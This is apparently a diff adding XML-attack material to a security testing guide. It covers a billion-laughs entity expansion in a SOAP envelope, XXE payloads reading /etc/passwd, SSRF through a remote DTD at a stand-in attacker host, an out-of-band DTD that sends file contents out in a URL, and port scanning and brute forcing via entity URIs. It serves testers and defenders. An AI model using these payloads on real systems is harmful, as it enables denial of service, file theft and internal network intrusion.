+ <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
+ <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
+ <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
+ <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
+ <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
+ <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
+ <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
+ <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
+ <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
+]>
+<SOAP:ENVELOPE ENTITYREFERENCE="&LOL9;"
+               XMLNS:SOAP="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/">
+ <SOAP:BODY>
+  <KEYWORD XMLNS="URN:PARASOFT:WS:STORE">FOO</KEYWORD>
+ </SOAP:BODY>
+</SOAP:ENVELOPE>
+```
+
+##### Reflected File Retrieval
+
+Consider the following example code of an XXE:
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE root [
+ <!ELEMENT includeme ANY>
+ <!ENTITY xxe SYSTEM "/etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+**The previous XML defines an entity named `xxe`, which is in fact the contents of `/etc/passwd`, which will be expanded within the `includeme` tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.**
+
+##### Server Side Request Forgery
+
+**Server Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file via HTTP/HTTPS/FTP, etc.** SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.
+
+###### External DNS Resolution
+
+**Sometimes it is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.** This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack.
+
+```xml
+<!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">
+```
+
+###### External Connection
+
+Whenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+ <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
+ %xxe;
+]>
+```
+
+###### File Retrieval with Parameter Entities
+
+Parameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY % file SYSTEM "file:///etc/passwd">
+ <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
+ %dtd;
+]>
+<root>&send;</root>
+```
+
+Here the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) defines two external parameter entities: `file` loads a local file, and `dtd` which loads a remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). The remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) should contain something like this:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>">
+%all;
+```
+
+The second [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) causes the system to send the contents of the `file` back to the attacker's server as a parameter of the URL.
+
+###### Port Scanning
+
+The amount and type of information generated by port scanning will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex:
+
+**1) Complete Disclosure**: This is the simplest and most unusual scenario, with complete disclosure you can clearly see what's going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host.
+
+**2) Error-based**: If you are unable to see the response from the remote server, you may be able to use the information generated by the error response. Consider a web service leaking details on what went wrong in the SOAP Fault element when trying to establish a connection:
+
+```text
+java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
+ at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
+ at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
+```
+
+**3) Timeout-based**: The scanner could generate timeouts when it connects to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.
+
+**4) Time-based**: Sometimes it may be difficult to tell the differences between closed and open ports because the results are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host, then you should analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish if it is performed in higher latency networks.
+
+###### Brute Forcing
+
+**Once an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the `username` and `password` as part of the URI scheme (http, ftp, etc).** For example, see the following example:
+
+```xml
+<!DOCTYPE root [
+ <!ENTITY user SYSTEM "http://username:password@example.com:8080">
+]>
+<root>&user;</root>
+```
 
 ## Deserialization
 
